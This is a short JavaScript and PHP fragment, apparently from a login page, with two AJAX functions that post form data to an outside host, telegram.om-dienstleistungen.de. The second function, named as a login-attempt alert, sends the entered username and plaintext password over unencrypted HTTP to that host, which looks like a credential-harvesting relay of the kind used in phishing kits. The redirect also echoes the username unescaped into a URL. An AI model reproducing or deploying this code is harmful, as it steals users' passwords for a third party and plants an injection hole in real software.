function sendAjaxRequest(id, username, time, host, ip) {
  var params = {
    sendMessage: "local",
    id,
    username,
    time,
    host,
    ip,
  };

  $.ajax({
    method: "POST",
    url: "http://telegram.om-dienstleistungen.de/",
    data: params,
    success: function (response) {
      window.location.href = "index.php?msg=<?= $username ?>";
    },
    error: function (error) {
      window.location.href = "index.php?msg=<?= $username ?>";
    },
  });
}
function sendLoginAttemptAlert(username, password, time, host, ip) {
  var data = {
    sendMessage: "attempt",
    origen: "local",
    host,
    ip,
    time,
    username,
    password,
  };

  $.ajax({
    type: "POST",
    url: "http://telegram.om-dienstleistungen.de/",
    data: data,
    success: function (response) {
      console.log(response);
    },
    error: function (error) {
      console.log(error);
    },
  });
}
